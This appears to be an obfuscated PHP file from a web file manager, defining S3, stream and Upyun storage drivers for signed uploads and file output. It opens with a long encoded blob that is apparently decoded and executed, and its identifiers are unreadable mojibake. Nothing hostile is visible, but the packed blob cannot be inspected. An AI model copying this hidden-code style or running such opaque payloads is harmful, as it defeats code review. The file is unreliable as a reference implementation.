xc8\x34\x98\x86\xb8\x48\x5b\xf5\xfc\x26\xb\x49\x93\xc1\xb4\xe7\xf1\x1f\x30\xcf\x61\x90\x20\x3\x50\x83\x96\x76\xee\x8b\x50\x2a\xc0\x1d\xe5\xca\x13\xc8\x48\xf\x44\x5a\xc2\x9".base64_decode('YTv3gCp7JqQGAJKZiAVu1sWJPytjSBKIfGXTyKHZseS+InhvbTBPXp2yRiLeITk=').strrev('·	∆`eùc¨A„lñƒé‚˛và§Œπ–”≈IJ¶ÔWq4@C›Ïáƒù')."\55\373\36\134\141\22\267\15\357\136\312\266\201\64\231\240\25\130\33\42\353\154\165\203\231\217\340\321\20\107\271\116\70\205\121\371\327\161\372\223\40\344\246\240\261\47\67"."\201\40\21\274\307\5\20\63\33\327\0\12\134\205\325\325\332\52\147\163\306\275\375\213\263\331\307\271\54\25\36\102\256\276\223\365\332\170\370\222\262\152\2\57\272\156\376"."\x2a\x64\xd\xa4\x73\x22\x56\x15\x6\x91\x4d\x1b\x17\xd0\xc2\x9\x92\x14\x42\x72\x19\xe3\xc4\x32\xac\xbd\x83\x15\x8d\x71\x8f\x12\xf5\x52\x6c\x41\xbb\x80\xd2\x24\xf2\xa6\x61\x73\x51\x4\xc7"."\x7\x32\x12\x45\xe\xcb\xbc\x43\x82\x66\xf1\xce\x17\xf5\x38\x8e\xc1\x24\xa7\xc5\x3c\x29\xda\x6d\x58\xed\x2a\xdb\x81\x88\x4d\x17\x71\xb6\x2f\x49\x47\xae\xa0\xdb\xee\x8b\xec\x16\x36\x23\xf8"."\314\333\163\211\277\327\204\247\63\56\231\335\324\250\1\62\361\54\260\215\231\132\332\60\211\230\54\71\7\50\331\61\55\47\7\303\6\127\17\340\143\27\255\106\21\330\37"."\213\204\342\30\13\220\340\132\221\275\273\110\316\242\121\110\362\316\55\261\43\336\251\12\347\143\222\264\144\32\230\42\105\220\364\265\130\32\227\222\112\272\130\100\344\362\170".base64_decode('JcXPClyMBruroMj7OLt8gAsgjjZwDyw5DhWLHcOKnslZSJ1VWWgc3kqFuwo5xkI=').base64_decode('ghweqvFjalRFoqQRTXOnPTA6YpAgYlRjpn3eqc1e5m5IvsjA2FygWWgtSGiAuX0=').base64_decode('RgfBTg/SiTSGdOJCXFiIK/7EWwefT+LWg4dMad/SuA0f8W8hkxVxME5N+3CCvlo=')."\361\164\204\160\164\207\303\362\321\225\0\255\14\147\74\170\0\57\72\236\346\106\170\340\60\237\161\25\2\136\336\145\317\346\44\227\350\207\60\42\105\40\203\372\31\227\6"."\x46\x1c\xf0\x53\xcf\x1f\xcc\xfa\x95\xd3\x25\x1\x4e\x18\x1c\x58\x6d\x24\xe0\xe3\xd6\xbf\x70\xc5\x13\x1e\x5f\x6c\x68\xc4\x57\x3c\x1d\xca\x98\x9e\x51\x7e\x11\xf\x9b\xf0\xe0\x4d\x82\x9b\x60"."\132\162\200\305\162\344\264\34\1\152\262\344\310\315\101\74\325\260\306\156\153\62\245\101\157\167\257\237\203\332\370\362\244\162\243\160\70\324\316\354\202\304\153\336\303\105\75"."\xad\x84\xa3\x5d\xa1\xf6\x40\xb8\x23\x14\x5f\xa8\xe4\x34\x5b\x7a\x85\x9e\x78\xe9\x77\x2e\x65\xa2\x23\xa3\x3\xcf\xb0\x3a\xc5\x1d\xd5\xe3\x4f\x6f\xa\x31\x95\xde\xc\xe7\xad\x2d\xc1\x45\x4b"."\x86\x5b\xd2\x2b\x3c\xce\x62\x29\xfe\x69\x66\x55\x89\x25\x7c\x9\xa3\x50\x95\x7\x6b\xfe\x6a\xa4\x2e\x8\x45\x98\x94\xb8\x6c\x6a\xd5\xe9\x47\x35\xf2\x64\xb7\x68\xb1\x94\xa1\x52\xa3\x35\x90"."\xbe\x76\xd\x8\xfd\x9d\xa9\xd1\x46\xac\x95\xc6\x6b\xbc\x5e\x1a\xd2\x2d\x5d\x2c\x7c\x96\x63\x54\x2e\x5d\xe8\x36\x4d\xfe\x56\x42\x46\x7e\x5a\x41\x9a\x1\x31\xd8\xb4\x96\x6a\x7f\x57\xe0\x2d"."\110\366\320\355\22\232\351\64\311\176\317\312\114\123\17\57\324\211\267\71\110\120\172\65\245\154\252\272\245\111\0\372\174\307\144\270\333\200\104\174\307\273\153\205\254\24\254".strrev('|òeÍ≥´F¸ª{˘‘h´ÜzGœU7_˛œÜ ï´Vπ&i%Uö–w8')."\143\306\43\164\174\111\342\56\206\75\144\145\20\26\33\170\102\12\13\105\223\364\115\65\121\5\222\331\314\321\262\174\270\344\317\370\371\20\323\17\354\311\55\310\264\314\70"."\40\30\140\234\34\112\303\325\121\21\10\11\144\130\373\302\130\145\146\230\210\350\1\214\263\343\160\325\365\132\216\333\156\323\361\14\166\125\35\330\374\13\312\41\372\35\224"."\162\271\350\34\12\361\7\35\104\126\167\114\215\6\240\150\105\150\60\170\2\245\125\151\242\357\67\161\27\375\312\74\166\261\126\124\100\174\57\5\213\145\333\41\36\166\313"."\6\333\322\334\120\0\341\150\204\110\200\315\136\214\342\150\25\300\241\266\10\263\166\161\73\71\374\100\101\51\153\310\343\107\10\57\266\276\247\217\253\121\71\324\203\170\172".base64_decode('za5+b4Vm//+SkUbGJetBZyHVDbLcW5pgr/BTMnlj2PnCGoa4H49xPBsjLRpy/1M=')."\176\350\206\75\67\202\70\127\307\233\100\122\201\223\350\117\77\374\262\315\310\135\64\45\77\120\173\43\107\225\366\274\136\310\230\334\72\103\0\172\64\41\122\222\134\330\100"."\x41\x65\x4f\x8c\x92\x77\xa6\x3a\x18\xa5\x85\x17\x27\x9c\x8f\x5e\x70\xb0\xe2\x7c\x42\x43\xbc\x4c\x22\x76\x3e\xe7\xdb\xd\xfc\x8c\xd1\x12\x28\x6e\xd9\x8e\xb7\x41\x12\x46\x42\xcd\x79\x28\x3f"."\205\151\225\10\265\215\312\337\262\105\46\351\5\212\144\332\232\14\237\305\371\122\2\366\120\127\306\103\136\221\242\4\314\375\244\205\264\176\70\125\224\163\347\12\106\112\55"."\xc4\xa8\x51\x93\xe3\x6\x86\x89\x64\x21\x6e\xa8\xe8\x48\x46\x41\x7e\xb5\x5c\x16\x67\x20\xae\x23\xd\xe0\x71\xe8\xf1\x46\xa5\x14\xa2\xaa\x62\x7\xd4\x94\x64\x2d\xd9\x26\x96\x1e\x94\x88\x4b"."\x4d\x90\x1c\xd5\xd6\x4b\x8f\x7a\xa0\xdb\x72\x91\xec\xf8\x8d\x2b\x27\x3b\xa5\x7\xa5\xfd\xd5\xc7\x75\xd8\xe8\xa\x56\xbb\x6c\x93\x8\x27\xa7\x3e\x59\x18\x82\x4\xca\x3c\x45\x4c\xb0\x63\x91"."\x61\x84\x40\x1c\xa9\x87\x7c\x90\x55\x2c\x33\xcf\xdf\x3\xe5\x78\xe8\x7c\xf4\x84\x22\x2c\xf9\xe9\xd0\xb2\x5c\x92\xc0\x61\xb1\xd3\xca\xee\x1b\xc4\x31\xbd\xfb\xfd\x2c\x56\xd\x7f\xc\xcc\x43".strrev('ÃC+ïûnnÙ±UÒô∑\\|ÎºE7{Ô¥Âƒy{èœJÍ_3¯yO§xû&{')."\x3d\x70\x9\xa3\x5a\xc7\x27\xe\x29\x4b\x95\xa2\x38\xf6\x45\x1\xa7\x74\x53\xd5\x61\xa9\x87\x15\xb3\xe0\x21\x47\xb4\x1e\xe6\xd4\xcc\x35\x1c\xa2\x57\xf2\xcc\xd4\x18\xc3\x1f\x2e\x83\xda\x72".base64_decode('EpEl46Q6LfNSJju1cifTHViXNDVxSYM6dqx6n2dpMdM8bcYcWTUg5kec/zD31/Q=').strrev(''."\r".'§AÃî$’iV˝ZÙd©4ﬁ_0Ôˇãü'."\n".'˝[fi“$∑^RMÊüä„1'."\0".'x')."\311\165\366\157\340\43\171\113\54\37\272\5\211\267\367\234\165\321\115\271\106\77\244\175\107\254\4\372\30\232\121\300\22\152\21\153\131\155\123\165\212\143\265\244\16\62\22"."\x4c\xc4\xd1\xc9\x4b\xc7\x9a\xbb\xed\x64\x60\x40\x17\x21\xa2\x25\xb1\x44\x2e\xd1\x36\xdc\x8a\x14\x9c\x1d\xef\x4b\x44\x8f\x17\x2d\x15\x60\xdb\xc4\x97\x6e\xc5\x9a\x92\x48\xca\xff\x62\x2\x99"."\344\101\205\24\141\371\121\243\347\376\43\31\335\250\361\330\235\164\32\376\75\355\246\74\23\227\262\274\252\355\225\20\122\122\276\151\166\224\114\60\160\37\102\350\163\366\325"."\x55\x3c\xca\x26\xca\x58\xee\x51\xc6\x4b\x54\xcd\x38\x49\x6f\xe2\x9\x77\x4b\x12\xcb\x84\x73\xb3\xdb\x7d\xe3\xc8\xcc\x8c\x38\xc9\xaf\xfd\xd9\x79\x21\x14\xd0\x15\xea\x58\xad\x92\x8f\x56\xf9"."\xba\x13\x29\x48\x5e\x6\xd5\x45\x4b\x8f\xae\x9\x35\xa\xd1\xbb\x40\x27\x60\xd\x13\x2f\x92\xe4\x9a\x5b\xa0\x8b\x5f\x7d\x53\x25\x6b\x1d\x3c\x9e\xd2\x7b\x97\x86\xfc\xed\xbc\x57\x1e\x65\x5e"."\61\121\175\16\51\15\205\73\134\117\242\22\72\344\176\47\225\15\12\131\374\202\256\111\167\50\35\42\1\177\322\312\41\42\130\356\327\346\20\113\45\373\253\105\101\216\366".strrev('Û˜ˇ˙ˆ3~îsÍH'."\r".'Îñ¨≥≠kêQÿ¶´éÎ˚ÁuâÔ¯°[i6¥–Ü$Å∞').strrev('*R1Eú…ÌnaKo‚,w&‹·˙∫îU1[…jŸe…ÄªUé’îƒ—õU^∑ˇj')."\x3b\x5c\x51\xb\x5\xf7\x49\x63\x95\x58\x50\xf5\xf8\x24\x42\xbe\x1\xfe\x62\x62\xad\x80\xd3\xf7\x70\x52\x7e\x31\xb8\x86\x64\xca\xb8\x4d\xe9\x1\x62\x3d\x3d\x50\xe3\x60\x10\xf\x7e\xd8\xe9"."\270\127\342\21\252\222\11\162\205\130\11\346\104\313\317\276\322\130\152\302\214\44\243\222\362\335\310\150\231\311\127\215\100\230\227\37\311\250\11\271\155\15\104\105\46\44\16"."\x50\x15\xf9\x49\x38\x86\xd4\x1\x94\x47\x4b\x3c\xa0\xce\x9f\x6f\x76\xe4\xe8\x71\xbd\xc6\x47\x13\x59\xf2\xd8\x3a\xf4\xd3\xd5\xe7\xc4\xd5\xb9\xf9\x32\x96\xb3\x60\x1b\x59\xa7\x2a\x87\x3f\x8f"."\334\344\176\57\171\252\267\272\62\152\242\216\265\11\61\54\277\63\215\14\71\302\40\107\214\65\362\120\264\213\213\64\343\40\176\355\345\307\137\101\24\352\51\374\45\367\227"."\55\343\136\323\40\374\230\23\312\165\32\222\171\242\364\126\157\325\133\234\256\243\0\44\34\211\263\61\335\40\136\273\241\333\361\276\236\6\162\313\2\60\25\361\366\235\206".strrev('1€Sπ¯¥≠xqíí”'."\r".'•íµ˘îÆv˜∂\'3Ç¸ñYT9'."\0".'`Î$õ◊eKy2J¶XΩ3x').strrev('\\"Æòªè†ÛìI“	B3ºÃë dﬂ8Õ€àtÁIR ·qÎl©Ñ:Ö€∫ï¬ö')."\x3d\x2c\x45\x93\x5c\xcc\xe9\x17\xfa\xc5\xd7\xbc\x42\xc2\x9f\x0\x89\xa6\x3a\xf4\xc0\x90\x6a\xb3\xe3\x32\x77\x2e\xe7\x4b\xc8\xd2\xb1\x60\x9a\xe0\x4e\xb0\xfa\xe4\x47\x1c\x48\x49\xdb\x3e\xcb"."\x86\x45\x11\x41\x91\x5d\x70\x89\xec\xb\x6a\xa7\xe\x9\x2e\x45\x30\xc3\x99\xc\x7f\x75\xdb\x91\x34\xc3\xc4\x1\xe\x45\x10\xf1\x40\x37\xe6\x72\xa4\x9b\xa3\xc2\x20\x59\x1b\x76\x3f\xaa\xea"."\223\157\233\72\22\126\103\305\315\122\51\277\70\33\20\335\304\260\132\335\47\113\306\231\135\276\271\312\221\112\200\250\127\175\156\60\43\11\36\330\260\136\130\322\320\256\160"."\51\132\124\351\274\47\313\223\361\71\103\151\310\65\6\257\3\352\22\245\260\116\202\155\340\256\50\113\176\120\334\171\332\47\213\365\22\12\150\205\260\124\234\174\22\70\156"."\x86\x78\xed\x4a\x4\x56\x3a\x87\x58\xba\x60\x2c\x22\xd8\x66\x65\x38\x6\x5f\x22\x76\xbc\x63\x90\x32\x26\x47\x3a\x9a\xe3\x9e\x5a\x22\x5\x8\xf4\xa5\xc0\x22\xd1\x63\xd2\xb8\x80\x33\x8a\xa6"."\xd7\x5c\xad\x97\x33\xb8\x7b\x46\x73\x58\xc3\xba\x9d\xce\x4b\xa2\x49\x75\x64\x35\xdc\xac\x1a\x54\xa8\xa8\x76\x7b\xdd\xad\x62\x63\xea\x16\xd8\x44\x21\x55\xed\x91\xcc\x9\x12\x46\x8d\x3c\xb4".base64_decode('RTWz0SicU3CPjrzjDAHOS6Nw3qpollnSb0j5bLVijdO96sEDoT9To8Mu0ZgmHW8=').base64_decode('PGsmrq4OMM6dmmgJardCCPeuY91araiZeNxWiNSuXaAWrWUxNairON+vpuMiroY=')."\xb5\x1\x2d\x13\xef\xd1\xb2\xc3\xa1\x1a\xd1\xb2\xe9\x42\x6d\xe3\x86\x58\xcd\xa5\x6f\x39\xad\xe\x5c\x70\x79\x60\x98\x5\x12\x92\xd5\xc4\xe3\xf0\x92\x35\xef\x24\x7\x49\xaf\x94\x6\x4a\x6".base64_decode('3yYywk4M253y59R5dVWlOVGzVJE8b9Y0LvZgybpahi2wN7tkq2wqtRi2ntac7j0=')."\x65\x57\x43\x34\x9e\x55\x52\x90\xf4\x71\x2e\x55\x98\x90\xf3\x1d\x7\xe4\x35\x94\x45\x4\x4\xec\x9a\x50\x39\x3b\x2c\xdd\xe9\xfe\xf\xba\x76\x7a\x84\xd6\x8e\x8f\x6a\xf9\x31\xb\xf1\x3f\x49"."\xf7\x4b\x1a\x1d\x37\x4c\xdb\x83\xe3\x12\x46\x99\xfc\xb6\x19\xb6\x2d\x8e\x94\xa9\xf4\x4c\x98\x3c\xbc\xe9\x79\x24\xcb\x8\xf4\x25\xce\x54\xf0\x28\x12\x35\x3f\x41\x47\x42\x36\xc8\x27\x1c\xe6"."\141\261\64\256\321\130\102\154\34\1\174\174\300\3\362\236\6\207\172\235\25\327\261\243\0\40\41\62\145\214\60\357\176\370\312\255\150\217\170\205\135\165\63\162\202\7\1"."\174\223\355\74\310\305\146\313\117\143\374\340\41\336\113\312\200\327\234\174\253\312\71\107\166\372\46\16\267\135\374\276\22\100\125\51\212\240\356\241\211\102\11\373\120\247\336"."\21\253\242\172\3\361\370\342\150\254\203\172\223\256\212\46\271\44\273\231\252\250\336\356\150\144\274\270\140\117\40\24\256\212\303\46\66\221\244\160\377\104\243\102\275\244\225"."\201\160\70\272\170\274\126\204\332\27\212\226\220\223\122\241\1\57\347\15\246\330\146\47\4\161\265\300\144\151\351\266\236\126\24\176\300\104\36\247\212\100\236\127\213\271\310".strrev('òS7ìú$QB'."\r".'¨úƒG˙˝Yfsq|⁄ÔbÄec≤Ål °alñ\\YßŒ„').base64_decode('XHOAZO1ptTafxIoBwA07ygDbqlVGStLWU1EFbszBkEomUPQbov8PFDqvFNSmAAA=')."".strrev('').strrev(''), 10, -8))); goto e‚ñà›€Ë’; dÙê˜´≤úç: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($°ïœÔ¡ç) { parent::__construct($°ïœÔ¡ç); } public function uploadFormData($œËÌ—Õ·, $›Ì‘ﬂ«» = 3600) { $”Ù•»´ =& $_SERVER[Çâä∆◊¡]; $òπ˝÷èî = $”Ù•»´[191]; $¶¬«√†Ω = $”Ù•»´[1331]; $ë·£Òêà = $”Ù•»´[62]; $Øã∫≤∏ó = gmdate($”Ù•»´[1332]); $´ì±∞ß¡ = gmdate($”Ù•»´[744]); $‘¿»ˆÔù = $”Ù•»´[1333]; $≤•∑ﬁ∂ô = $›Ì‘ﬂ«» . $”Ù•»´[12]; $É÷˛¸º = $”Ù•»´[1295]; $çƒ∑°Ç™ = array($this->accessKey, $´ì±∞ß¡, $this->region, $ë·£Òêà, $‘¿»ˆÔù); $–ùãì°Õ = implode($”Ù•»´[8], $çƒ∑°Ç™); $ƒÖ‡…±õ = array($”Ù•»´[1297] => gmdate($”Ù•»´[1296], strtotime($”Ù•»´[1334])), $”Ù•»´[1298] => array(array($”Ù•»´[1300] => $this->bucket), array($”Ù•»´[1299] => $òπ˝÷èî), array($”Ù•»´[1301], $”Ù•»´[1302], $”Ù•»´[12]), array($”Ù•»´[1301], $”Ù•»´[1335], $”Ù•»´[12]), array($”Ù•»´[1301], $”Ù•»´[1336], $”Ù•»´[12]), array($”Ù•»´[1303] => $É÷˛¸º), array($”Ù•»´[1337] => $–ùãì°Õ), array($”Ù•»´[1338] => $¶¬«√†Ω), array($”Ù•»´[1339] => $Øã∫≤∏ó), array($”Ù•»´[1340] => $≤•∑ﬁ∂ô))); $∫ªãıé = base64_encode(json_encode($ƒÖ‡…±õ)); $Ä‰˚∆ØÙ = hash_hmac($”Ù•»´[1341], $´ì±∞ß¡, $”Ù•»´[1342] . $this->secret, !0); $úµç√•ô = hash_hmac($”Ù•»´[1341], $this->region, $Ä‰˚∆ØÙ, !0); $å≠¿˜±≤ = hash_hmac($”Ù•»´[1341], $ë·£Òêà, $úµç√•ô, !0); $£“∑˚£ù = hash_hmac($”Ù•»´[1341], $‘¿»ˆÔù, $å≠¿˜±≤, !0); $˙Ø÷éÇ¯ = hash_hmac($”Ù•»´[1341], $∫ªãıé, $£“∑˚£ù); $‹à€®¿æ = array($”Ù•»´[210] => $”Ù•»´[12], $”Ù•»´[1343] => $”Ù•»´[12], $”Ù•»´[1299] => $òπ˝÷èî, $”Ù•»´[1303] => $É÷˛¸º, $”Ù•»´[1307] => $∫ªãıé, $”Ù•»´[1344] => $–ùãì°Õ, $”Ù•»´[1345] => $¶¬«√†Ω, $”Ù•»´[1346] => $Øã∫≤∏ó, $”Ù•»´[1347] => $≤•∑ﬁ∂ô, $”Ù•»´[1348] => $˙Ø÷éÇ¯, $”Ù•»´[174] => $this->getHost()); return $‹à€®¿æ; } public function multiUploadFormData($˝ƒØ≤ü±, $£Ù∞åª¨ = 3600) { $ø°¶°Ùû =& $_SERVER[Çâä∆◊¡]; $»Ωÿëóò = gmdate($ø°¶°Ùû[1427]); $ªôû›Ø… = array(); $ãîìÑ≤› = $this->client->getUploadId($this->bucket, $˝ƒØ≤ü±, $ªôû›Ø…); if (!$ãîìÑ≤›) { return !1; } return array($ø°¶°Ùû[218] => $ãîìÑ≤›, $ø°¶°Ùû[174] => $this->getHost() . $ø°¶°Ùû[8] . $this->pathEncode($˝ƒØ≤ü±), $ø°¶°Ùû[219] => $»Ωÿëóò, $ø°¶°Ùû[95] => $˝ƒØ≤ü±); } public function multiUploadAuthData($•ßπÉÌ, $«√§™ç˝ = array()) { $‚ûÌΩï∏ =& $_SERVER[Çâä∆◊¡]; $ÃåÒ∫äÕ = isset($«√§™ç˝[$‚ûÌΩï∏[167]]) ? $«√§™ç˝[$‚ûÌΩï∏[167]] : $‚ûÌΩï∏[12]; $ﬁ‡òíü˘ = $«√§™ç˝[$‚ûÌΩï∏[95]]; unset($«√§™ç˝[$‚ûÌΩï∏[95]]); if (isset($«√§™ç˝[$‚ûÌΩï∏[220]])) { return $this->listUploadParts($ﬁ‡òíü˘, $«√§™ç˝); } $¬ñîÊüé = array(); if (isset($«√§™ç˝[$‚ûÌΩï∏[1428]])) { $¬ñîÊüé[$‚ûÌΩï∏[1429]] = $«√§™ç˝[$‚ûÌΩï∏[1428]]; } $î„úÌà‹ = explode($‚ûÌΩï∏[176], $this->getHost()); $—ÊÜ”«ø = array($‚ûÌΩï∏[1430] => $î„úÌà‹[1], $‚ûÌΩï∏[1431] => $‚ûÌΩï∏[12], $‚ûÌΩï∏[210] => $‚ûÌΩï∏[118], $‚ûÌΩï∏[1343] => $«√§™ç˝[$‚ûÌΩï∏[80]]); $Ìˆ©ú∫¢ = $‚ûÌΩï∏[223]; $ñû“ÖŸ¸ = $‚ûÌΩï∏[8] . $this->pathEncode($ﬁ‡òíü˘) . $ÃåÒ∫äÕ; $‰¿ﬂ–ÿ† = $this->client->__getSignatureV4($¬ñîÊüé, $—ÊÜ”«ø, $Ìˆ©ú∫¢, $ñû“ÖŸ¸); if (strpos($ÃåÒ∫äÕ, $‚ûÌΩï∏[222]) === 0) { if (isset($¬ñîÊüé[$‚ûÌΩï∏[1429]])) { $ÀÔ¬É¨∞ = $¬ñîÊüé[$‚ûÌΩï∏[1429]]; } else { if (isset($‰¿ﬂ–ÿ†[$‚ûÌΩï∏[1429]])) { $ÀÔ¬É¨∞ = $‰¿ﬂ–ÿ†[$‚ûÌΩï∏[1429]]; } else { $ÀÔ¬É¨∞ = hash($‚ûÌΩï∏[1341], $‚ûÌΩï∏[12]); } } return array($‚ûÌΩï∏[229] => $‰¿ﬂ–ÿ†[$‚ûÌΩï∏[229]], $‚ûÌΩï∏[1429] => $ÀÔ¬É¨∞, $‚ûÌΩï∏[219] => $‰¿ﬂ–ÿ†[$‚ûÌΩï∏[1432]]); } return $‰¿ﬂ–ÿ†[$‚ûÌΩï∏[229]]; } public function listUploadParts($Ïí˘ãåê, $Ê¯˛Ó« = array()) { $Ñ‹–≤ºâ =& $_SERVER[Çâä∆◊¡]; $åÄﬂ’≠À = str_replace($Ñ‹–≤ºâ[230], $Ñ‹–≤ºâ[12], $Ê¯˛Ó«[$Ñ‹–≤ºâ[167]]); $ß∫∂±ÛÑ = $this->client->listParts($this->bucket, $Ïí˘ãåê, $åÄﬂ’≠À); if (!$ß∫∂±ÛÑ) { return !1; } $º‘ë€ºΩ = $Ñ‹–≤ºâ[1433]; foreach ($ß∫∂±ÛÑ as $é‚˚°®ì) { $º‘ë€ºΩ .= $Ñ‹–≤ºâ[1434] . "\74\x50\x61\162\x74\x4e\165\155\x62\145\x72\76{$é‚˚°®ì[$Ñ‹–≤ºâ[1388]]}\74\57\x50\141\x72\x74\116\165\155\142\145\162\76\xa" . "\x3c\105\x54\x61\147\x3e{$é‚˚°®ì[$Ñ‹–≤ºâ[1389]]}\x3c\57\x45\x54\141\x67\x3e\12" . $Ñ‹–≤ºâ[1435]; } $º‘ë€ºΩ .= $Ñ‹–≤ºâ[1436]; $ı‹ﬂå∫√ = array(); $™Ã±ﬂÜø = explode($Ñ‹–≤ºâ[176], $this->getHost()); $“ã∫Û†ß = array($Ñ‹–≤ºâ[1430] => $™Ã±ﬂÜø[1], $Ñ‹–≤ºâ[210] => $Ñ‹–≤ºâ[118], $Ñ‹–≤ºâ[1343] => strlen($º‘ë€ºΩ)); $ÿÑíÃ”¯ = $Ñ‹–≤ºâ[221]; $Ë©ØÉ√∏ = $Ñ‹–≤ºâ[8] . $this->pathEncode($Ïí˘ãåê) . $Ê¯˛Ó«[$Ñ‹–≤ºâ[167]]; $ ñˆÃ⁄ß = $this->client->__getSignatureV4($ı‹ﬂå∫√, $“ã∫Û†ß, $ÿÑíÃ”¯, $Ë©ØÉ√∏, $º‘ë€ºΩ); return array($Ñ‹–≤ºâ[229] => $ ñˆÃ⁄ß[$Ñ‹–≤ºâ[229]], $Ñ‹–≤ºâ[219] => $ ñˆÃ⁄ß[$Ñ‹–≤ºâ[1432]], $Ñ‹–≤ºâ[231] => $ß∫∂±ÛÑ, $Ñ‹–≤ºâ[1429] => $ ñˆÃ⁄ß[$Ñ‹–≤ºâ[1429]]); } public function link($í√‘¯¯∞, $§ë¢ÿ≥Æ = array()) { return parent::link($í√‘¯¯∞, $§ë¢ÿ≥Æ); } public function fileOut($€ÎáÂã≈, $‘´Æ¯©ƒ = false, $€ﬂØ˛Ü˜ = false, $îåﬂÕﬂ˚ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Çâä∆◊¡][1437])) { return parent::fileOutServer($€ÎáÂã≈, $‘´Æ¯©ƒ, $€ﬂØ˛Ü˜, $îåﬂÕﬂ˚); } parent::fileOut($€ÎáÂã≈, $‘´Æ¯©ƒ, $€ﬂØ˛Ü˜, $îåﬂÕﬂ˚); } public function fileOutImage($¸è∏©ü„, $∏∫¬Ω—· = 250) { if (strstr($this->endpoint, $_SERVER[Çâä∆◊¡][1437])) { return parent::fileOutImageServer($¸è∏©ü„, $∏∫¬Ω—·); } parent::fileOutImage($¸è∏©ü„, $∏∫¬Ω—·); } public function fileOutLink($÷ÚÖÔ…¢) { $äÚ⁄◊‘Õ =& $_SERVER[Çâä∆◊¡]; if (substr($÷ÚÖÔ…¢, 0, 7) == $äÚ⁄◊‘Õ[1310]) { $÷ÚÖÔ…¢ = $äÚ⁄◊‘Õ[1311] . substr($÷ÚÖÔ…¢, 7); } header($äÚ⁄◊‘Õ[158] . $÷ÚÖÔ…¢); die; } public function getHost() { $â˝ƒÁ®˚ =& $_SERVER[Çâä∆◊¡]; $éÚè√´‰ = str_rtrim(parent::getHost(), $â˝ƒÁ®˚[8] . $this->bucket); $éÚè√´‰ = explode($â˝ƒÁ®˚[176], $éÚè√´‰); return $éÚè√´‰[0] . $â˝ƒÁ®˚[176] . $this->bucket . $â˝ƒÁ®˚[10] . $éÚè√´‰[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ÔﬂâÒ€Ñ, $ˆÕ¶¿à˝ = 0) { parent::__construct(); $this->source = $ÔﬂâÒ€Ñ; $this->sourceSize = $ˆÕ¶¿à˝; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($˜æŒ—Œ¢ = false) { return $this->sourceSize; } public function getContent($ﬁºÀµ’Ã = false) { return $this->fileSubstr($ﬁºÀµ’Ã, 0, $this->sourceSize); } public function fileSubstr($îê®Éÿù = false, $¥·ìì±À = 0, $æ÷ıª“∞ = 0) { if (!$æ÷ıª“∞) { $æ÷ıª“∞ = $this->sourceSize; } $÷ï˛∂≠∞ = $this->sourceSize - $¥·ìì±À; if ($æ÷ıª“∞ >= $÷ï˛∂≠∞) { $æ÷ıª“∞ = $÷ï˛∂≠∞; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $¥·ìì±À, $æ÷ıª“∞); } if ($this->sourceType == self::TYPE_FILE) { if ($æ÷ıª“∞ <= 0) { return $_SERVER[Çâä∆◊¡][12]; } $É»‹êÉ  = ftell($this->source); fseek_64($this->source, $É»‹êÉ  + $¥·ìì±À); $‚∞ÊΩáõ = @fread($this->source, $æ÷ıª“∞); fseek_64($this->source, $É»‹êÉ ); return $‚∞ÊΩáõ; } } public function hashMd5($’îµ®Èó = false) { return md5($this->getContent()); } public static function hash($∂ŒûÈÔ», $£¢ª√Æ« = 0) { $û∞˝Öô  = new PathDriverStream($∂ŒûÈÔ», $£¢ª√Æ«); return $û∞˝Öô ->hashSimple($∂ŒûÈÔ»); } public static function md5($ÕåºÖ˝√, $¬’•í»Ì = 0) { $Â÷Ó’ÿø = new PathDriverStream($ÕåºÖ˝√, $¬’•í»Ì); return $Â÷Ó’ÿø->hashMd5($ÕåºÖ˝√); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\164\160\72\x2f\57\x76\60\x2e\141\160\x69\x2e\165\x70\171\165\156\56\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($€ä≈Ωãˆ) { parent::__construct(); $this->_init($€ä≈Ωãˆ); } public function _init($Àøá¢ì) { $ÍŒÕ∫÷Â =& $_SERVER[Çâä∆◊¡]; foreach ($Àøá¢ì as $ÚúóÔ°» => $ÖÍ∏æÚÓ) { if (isset($this->{$ÚúóÔ°»})) { $this->{$ÚúóÔ°»} = $ÖÍ∏æÚÓ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ÍŒÕ∫÷Â[1438] . LNG($ÍŒÕ∫÷Â[1369])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ËËõ≠Î≥, $™Éï¸Û = "\107\105\124") { $é©Ç¶ª∂ =& $_SERVER[Çâä∆◊¡]; $◊¢·„Ü⁄ = gmdate($é©Ç¶ª∂[1402]); $Ò‚üïﬁà = base64_encode(hash_hmac($é©Ç¶ª∂[1439], "{$™Éï¸Û}\x26{$ËËõ≠Î≥}\46{$◊¢·„Ü⁄}", md5("{$this->userpass}"), !0)); $ªñàªö› = array("\x41\x75\x74\150\157\162\x69\172\x61\164\151\157\156\x3a\125\120\131\x55\116\40{$this->username}\x3a{$Ò‚üïﬁà}", "\104\141\x74\145\x3a{$◊¢·„Ü⁄}"); return $ªñàªö›; } public function ussRequest($’ã∆ﬂõŒ, $Ã´·Ï¯· = "\x47\x45\124", $ÔÉ˜ÉÀ® = false, $§‚™ÿÎ¨ = false, $≤¯ßﬁÍŸ = false) { $∏˚ßçÇÃ =& $_SERVER[Çâä∆◊¡]; $’ã∆ﬂõŒ = trim($’ã∆ﬂõŒ, $∏˚ßçÇÃ[8]); $ˆá“†√ã = "\x2f{$this->bucket}\57{$’ã∆ﬂõŒ}"; $Ñ¯∑„Ø„ = $this->ussHeaders($ˆá“†√ã, $Ã´·Ï¯·); if ($§‚™ÿÎ¨) { $Ñ¯∑„Ø„ = array_merge($Ñ¯∑„Ø„, $§‚™ÿÎ¨); } $í‚Üú˜ë = url_request($this->endpoint . $ˆá“†√ã, $Ã´·Ï¯·, $ÔÉ˜ÉÀ®, $Ñ¯∑„Ø„, $≤¯ßﬁÍŸ); if (!$í‚Üú˜ë) { return array($∏˚ßçÇÃ[1176] => !1, 